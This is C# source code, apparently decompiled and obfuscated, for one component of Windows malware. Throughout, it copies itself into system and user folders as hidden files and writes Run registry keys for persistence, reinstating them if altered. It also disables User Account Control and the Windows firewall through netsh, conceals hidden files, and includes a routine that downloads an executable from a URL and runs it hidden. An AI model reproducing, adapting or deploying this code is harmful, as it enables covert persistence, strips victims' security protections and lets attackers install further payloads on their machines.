using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using Microsoft.Win32;

internal class Class12
{
	private Mutex mutex_0;

	private Class11 class11_0;

	public void method_0()
	{
		method_1();
		method_6();
		method_2();
		class11_0.method_0();
	}

	private void method_1()
	{
		try
		{
			mutex_0 = new Mutex(initiallyOwned: true, Class1.class2_0.string_5);
			mutex_0.ReleaseMutex();
		}
		catch
		{
			Environment.Exit(0);
		}
	}

	private void method_2()
	{
		string fileName = Process.GetCurrentProcess().MainModule!.FileName;
		if (Class1.class2_0.bool_16)
		{
			Class1.class2_0.string_2[0] = Environment.GetEnvironmentVariable("SystemRoot") + "\\" + Class1.class2_0.string_0[0];
			Class1.class2_0.string_2[1] = Environment.GetEnvironmentVariable("AppData") + "\\" + Class1.class2_0.string_0[1];
		}
		else
		{
			Class1.class2_0.string_2[0] = Environment.GetEnvironmentVariable("TEMP") + "\\" + Class1.class2_0.string_0[0];
			Class1.class2_0.string_2[1] = Environment.GetEnvironmentVariable("ALLUSERSPROFILE") + "\\" + Class1.class2_0.string_0[1];
		}
		if (!method_5())
		{
			try
			{
				string[] string_ = Class1.class2_0.string_2;
				foreach (string text in string_)
				{
					if (!Class1.class4_0.method_5(text))
					{
						File.Copy(fileName, text);
					}
					if (Class1.class4_0.method_5(text))
					{
						File.SetAttributes(text, FileAttributes.Hidden);
					}
				}
			}
			catch
			{
			}
			if (Class1.class2_0.bool_16)
			{
				try
				{
					try
					{
						Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Class1.class2_0.string_1[0], '"' + Class1.class2_0.string_2[0] + '"');
					}
					catch
					{
					}
					try
					{
						Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", writable: true)!.SetValue(Class1.class2_0.string_1[1], '"' + Class1.class2_0.string_2[1] + '"');
					}
					catch
					{
					}
				}
				catch
				{
				}
			}
			else
			{
				try
				{
					try
					{
						Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Class1.class2_0.string_1[0], '"' + Class1.class2_0.string_2[0] + '"');
					}
					catch
					{
					}
					try
					{
						Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", writable: true)!.SetValue(Class1.class2_0.string_1[1], '"' + Class1.class2_0.string_2[1] + '"');
					}
					catch
					{
					}
				}
				catch
				{
				}
			}
			try
			{
				mutex_0.Close();
				string[] string_2 = Class1.class2_0.string_2;
				foreach (string fileName2 in string_2)
				{
					Process process = new Process();
					process.StartInfo.FileName = fileName2;
					process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process.Start();
				}
			}
			catch
			{
			}
			Environment.Exit(0);
			return;
		}
		try
		{
			if (Class1.class2_0.bool_16)
			{
				try
				{
					string text2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.GetValue(Class1.class2_0.string_1[0])!.ToString();
					string text3 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", writable: true)!.GetValue(Class1.class2_0.string_1[1])!.ToString();
					if (text2 != '"' + Class1.class2_0.string_2[0] + '"')
					{
						try
						{
							Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue(Class1.class2_0.string_1[0]);
						}
						catch
						{
						}
						try
						{
							Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Class1.class2_0.string_1[0], '"' + Class1.class2_0.string_2[0] + '"');
						}
						catch
						{
						}
					}
					if (text3 != '"' + Class1.class2_0.string_2[1] + '"')
					{
						try
						{
							Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", writable: true)!.DeleteValue(Class1.class2_0.string_1[1]);
						}
						catch
						{
						}
						try
						{
							Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", writable: true)!.SetValue(Class1.class2_0.string_1[1], '"' + Class1.class2_0.string_2[1] + '"');
							return;
						}
						catch
						{
							return;
						}
					}
					return;
				}
				catch
				{
					return;
				}
			}
			try
			{
				string text4 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.GetValue(Class1.class2_0.string_1[0])!.ToString();
				string text5 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", writable: true)!.GetValue(Class1.class2_0.string_1[1])!.ToString();
				if (text4 != '"' + Class1.class2_0.string_2[0] + '"')
				{
					try
					{
						Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue(Class1.class2_0.string_1[0]);
					}
					catch
					{
					}
					try
					{
						Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Class1.class2_0.string_1[0], '"' + Class1.class2_0.string_2[0] + '"');
					}
					catch
					{
					}
				}
				if (text5 != '"' + Class1.class2_0.string_2[1] + '"')
				{
					try
					{
						Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", writable: true)!.DeleteValue(Class1.class2_0.string_1[1]);
					}
					catch
					{
					}
					try
					{
						Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", writable: true)!.SetValue(Class1.class2_0.string_1[1], '"' + Class1.class2_0.string_2[1] + '"');
						return;
					}
					catch
					{
						return;
					}
				}
			}
			catch
			{
			}
		}
		catch
		{
		}
	}

	public void method_3(string string_0)
	{
		try
		{
			mutex_0.Close();
		}
		catch
		{
		}
		try
		{
			string text = Class1.class4_0.method_4(new Random().Next(5, 12)) + ".exe";
			new WebClient().DownloadFile(string_0, Environment.GetEnvironmentVariable("TEMP") + "\\" + text);
			Process process = new Process();
			process.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\" + text;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.Start();
			Environment.Exit(0);
		}
		catch
		{
		}
	}

	public void method_4()
	{
		try
		{
			class11_0.method_1();
		}
		catch
		{
		}
		try
		{
			if (Class1.class2_0.bool_16)
			{
				try
				{
					Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue(Class1.class2_0.string_1[0]);
					Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", writable: true)!.DeleteValue(Class1.class2_0.string_1[1]);
				}
				catch
				{
				}
			}
			else
			{
				try
				{
					Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue(Class1.class2_0.string_1[0]);
					Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", writable: true)!.DeleteValue(Class1.class2_0.string_1[1]);
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
		try
		{
			string[] string_ = Class1.class2_0.string_2;
			foreach (string path in string_)
			{
				File.Delete(path);
			}
		}
		catch
		{
		}
		Environment.Exit(0);
	}

	private bool method_5()
	{
		string[] string_ = Class1.class2_0.string_2;
		int num = 0;
		while (true)
		{
			if (num < string_.Length)
			{
				string string_2 = string_[num];
				if (!Class1.class4_0.method_5(string_2))
				{
					break;
				}
				num++;
				continue;
			}
			return true;
		}
		return false;
	}

	private void method_6()
	{
		try
		{
			Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", writable: true)!.SetValue("Hidden", "2", RegistryValueKind.DWord);
		}
		catch
		{
		}
		if (Class1.class2_0.bool_15)
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", writable: true);
				if (registryKey == null)
				{
					registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
				}
				registryKey.SetValue("EnableBalloonTips", "0", RegistryValueKind.DWord);
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
				if (registryKey2 == null)
				{
					registryKey2 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				}
				registryKey2.SetValue("EnableLUA", 0);
				registryKey2.Close();
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
				if (registryKey3 == null)
				{
					registryKey3 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				}
				registryKey3.SetValue("EnableLUA", 0);
				registryKey3.Close();
			}
			catch
			{
			}
		}
		try
		{
			Process process = new Process();
			string fileName = "netsh.exe";
			process.StartInfo.Arguments = "Firewall set opmode disable";
			process.StartInfo.FileName = fileName;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
			process.WaitForExit();
		}
		catch
		{
		}
		try
		{
			Process process2 = new Process();
			string fileName2 = "netsh.exe";
			process2.StartInfo.Arguments = "advfirewall set allprofiles state off";
			process2.StartInfo.FileName = fileName2;
			process2.StartInfo.UseShellExecute = false;
			process2.StartInfo.RedirectStandardOutput = true;
			process2.StartInfo.CreateNoWindow = true;
			process2.Start();
			process2.WaitForExit();
		}
		catch
		{
		}
	}

	public Class12()
	{
		Class51.smethod_0();
		class11_0 = new Class11();
		base._002Ector();
	}
}
